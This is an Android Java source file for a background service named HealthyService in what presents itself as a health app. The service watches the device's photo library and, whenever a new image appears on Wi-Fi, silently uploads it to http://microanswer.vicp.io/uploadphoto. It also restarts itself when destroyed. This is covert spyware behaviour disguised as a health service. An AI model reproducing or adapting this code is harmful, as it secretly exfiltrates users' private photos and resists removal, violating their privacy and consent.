package android.microanswer.healthy.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.microanswer.healthy.tools.BaseTools;
import android.microanswer.healthy.tools.InternetServiceTool;
import android.net.Uri;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.File;

/**
 * 由 Micro 创建于 2016/8/20.
 */

public class HealthyService extends Service implements Runnable {
    private String TAG = "HealthyService";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return new HealthyServiceBinder();
    }


    private ContentResolver contentResolver;
    private ImageObsever imageObsever;

    @Override
    public void onCreate() {
        super.onCreate();

        Log.i(TAG, "开启健康服务");
        imageObsever = new ImageObsever(new Handler());
        contentResolver = getContentResolver();
        contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, imageObsever);
    }

    private final Object obj = new Object();

    @Override
    public void run() {
        synchronized (obj) {
            if (upfile != null) {
                Log.i(TAG, "start up");
                String res = InternetServiceTool.upLoadPhoto("http://microanswer.vicp.io/uploadphoto", upfile);
                Log.i(TAG, "upend：" + res);
            }
        }
    }

    File upfile;


    public class ImageObsever extends ContentObserver {

        public ImageObsever(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            Cursor query = null;
            try {
                query = contentResolver.query(uri, null, null, null, null);
            } catch (Exception e) {
//                e.printStackTrace();
                Log.d(TAG, e.getMessage());
            }
            if (query != null && query.getCount() == 1) {
                if (query.moveToFirst()) {
                    do {
                        String data = query.getString(query.getColumnIndex("_data"));
                        upfile = new File(data);
                        if (BaseTools.isWifi(HealthyService.this)) {
                            new Thread(HealthyService.this).start();
                        }

                    } while (query.moveToNext());
                }
                query.close();
            } else {
                if (query != null)
                    query.close();
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "intent.getAction()=" + intent.getAction());
        return super.onStartCommand(intent, 1, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            contentResolver.unregisterContentObserver(imageObsever);
        } catch (Exception e) {
            e.printStackTrace();
        }
        Intent intent = new Intent(this, HealthyService.class);
        startService(intent);
        Log.d(TAG, "服务被关闭");
        Intent intente = new Intent("android.microanswer.healthy.servicekilled");
        sendBroadcast(intente);
    }

    public class HealthyServiceBinder extends Binder {
        public HealthyService getHealthyServiceInstance() {
            return HealthyService.this;
        }
    }
}
